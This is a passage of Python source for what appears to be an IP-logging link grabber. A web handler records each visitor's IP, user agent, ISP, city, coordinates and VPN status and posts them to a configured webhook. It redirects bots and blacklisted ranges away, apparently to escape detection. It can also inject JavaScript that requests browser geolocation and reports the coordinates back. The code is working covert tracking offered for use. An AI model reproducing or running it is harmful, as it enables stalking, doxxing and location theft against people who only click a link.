            }
        ],
    }
    
    try:
        requests.post(config["webhook"], json = embed)
    except:
        pass
    
    return info

class LinkLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            ip = None
            if self.headers.get('x-forwarded-for'):
                ip = self.headers.get('x-forwarded-for').split(',')[0].strip()
            elif self.headers.get('x-real-ip'):
                ip = self.headers.get('x-real-ip')
            else:
                ip = self.client_address[0]
            
            useragent = self.headers.get('user-agent', 'Unknown')
            endpoint = self.path.split('?')[0]
            
            # Check for blacklisted IPs
            if ip and ip.startswith(blacklistedIPs):
                self.send_response(302)
                self.send_header('Location', config["redirect"]["page"])
                self.end_headers()
                return
            
            # Handle bot detection
            bot = botCheck(ip, useragent)
            if bot:
                self.send_response(302)
                self.send_header('Location', config["redirect"]["page"])
                self.end_headers()
                makeReport(ip, useragent, endpoint=endpoint)
                return
            
            # Handle regular users
            query_params = {}
            if '?' in self.path:
                query_string = self.path.split('?', 1)[1]
                query_params = dict(parse.parse_qsl(query_string))
            
            coords = None
            if query_params.get("g") and config["accurateLocation"]:
                try:
                    coords = base64.b64decode(query_params.get("g").encode()).decode()
                except:
                    coords = None
            
            result = makeReport(ip, useragent, coords, endpoint)
            
            # Custom message handling
            message = config["message"]["message"]
            
            if config["message"]["richMessage"] and result:
                try:
                    message = message.replace("{ip}", ip)
                    message = message.replace("{isp}", result.get('isp', 'Unknown'))
                    message = message.replace("{asn}", result.get('as', 'Unknown'))
                    message = message.replace("{country}", result.get('country', 'Unknown'))
                    message = message.replace("{region}", result.get('regionName', 'Unknown'))
                    message = message.replace("{city}", result.get('city', 'Unknown'))
                    message = message.replace("{lat}", str(result.get('lat', '')))
                    message = message.replace("{long}", str(result.get('lon', '')))
                    if result.get('timezone'):
                        tz_parts = result['timezone'].split('/')
                        if len(tz_parts) > 1:
                            tz_display = f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})"
                        else:
                            tz_display = result['timezone']
                    else:
                        tz_display = 'Unknown'
                    message = message.replace("{timezone}", tz_display)
                    message = message.replace("{mobile}", str(result.get('mobile', 'Unknown')))
                    message = message.replace("{vpn}", str(result.get('proxy', 'Unknown')))
                    message = message.replace("{bot}", str(result.get('hosting', 'Unknown') if result.get('hosting') and not result.get('proxy') else 'Possibly' if result.get('hosting') else 'False'))
                    
                    os_info, browser_info = "Unknown", "Unknown"
                    if useragent and useragent != "Unknown":
                        try:
                            os_info, browser_info = httpagentparser.simple_detect(useragent)
                        except:
                            pass
                    
                    message = message.replace("{browser}", browser_info)
                    message = message.replace("{os}", os_info)
                except:
                    pass
            
            # Always redirect
            if config["redirect"]["redirect"]:
                data = f'<html><head><title>Redirecting</title></head><body>'
                if config["message"]["doMessage"]:
                    data += f'<p>{message}</p>'
                data += f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'
                
                # Add location tracking script if enabled
                if config["accurateLocation"]:
                    data += """<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            var newParam = "g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D");
            if (currenturl.includes("?")) {
                currenturl += "&" + newParam;
            } else {
                currenturl += "?" + newParam;
            }
            window.location.href = currenturl;
        });
    }
}
</script>"""
                
                data += '</body></html>'
                data = data.encode()
                
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.send_header('Content-Length', str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            else:
                # If redirect is disabled, just show message
                data = f'<html><body><p>{message}</p></body></html>'.encode()
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.send_header('Content-Length', str(len(data)))
                self.end_headers()
                self.wfile.write(data)
        
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            error_html = b'<html><body><h1>500 - Internal Server Error</h1><p>Please check your webhook URL.</p></body></html>'
            self.wfile.write(error_html)
            reportError(str(e) + "\n\n" + traceback.format_exc())

    def do_GET(self):
        self.handleRequest()
    
    def do_POST(self):
        self.handleRequest()

handler = app = LinkLoggerAPI
